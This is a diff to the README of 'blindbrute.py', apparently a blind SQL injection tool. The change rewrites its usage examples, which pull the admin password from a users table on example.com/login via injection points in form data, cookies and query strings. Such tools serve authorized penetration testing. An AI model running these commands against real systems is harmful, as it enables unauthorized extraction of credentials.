@@ -65,10 +65,11 @@ pip install -r requirements.txt
     
 
     Examples:
-        blindbrute.py -u "http://example.com/login" -d "username=sam&password=samspasswordINJECT" -t users -c password -w "username='admin'"
-        blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
-        blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
-        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status
+        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" -d "username=sam&password=samspasswordINJECT"
+        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" -ih Cookie "SESSION=abc123"
+        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" -qs "id=23875INJECT&Submit=Submit"
+        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" -f request.txt --binary-attack
+        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" -f request.txt --force keyword --keywords MISSING,error,exists -db MariaDB
 ```
 
 ## License
